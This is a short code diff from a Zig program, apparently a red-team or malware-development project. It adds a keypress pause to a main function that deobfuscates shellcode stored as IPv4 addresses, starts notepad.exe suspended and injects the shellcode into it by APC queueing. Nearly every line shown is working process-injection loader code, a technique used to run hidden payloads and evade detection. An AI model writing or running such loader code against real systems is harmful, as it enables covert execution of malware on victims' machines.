@@ -17,6 +17,8 @@ pub fn main() !void {
     const shell_code = try payload_obfuscation.ipv4.deobfuscate(allocator, &ipv4_array);
     defer allocator.free(shell_code);
 
+    _ = try std.io.getStdIn().reader().readByte();
+
     const process_info = try sec.process.createSuspendedProcess(allocator, "notepad.exe", .Suspended);
     try code_injection.remote.injectShellCodeViaApc(process_info.h_process, process_info.h_thread, shell_code);
 
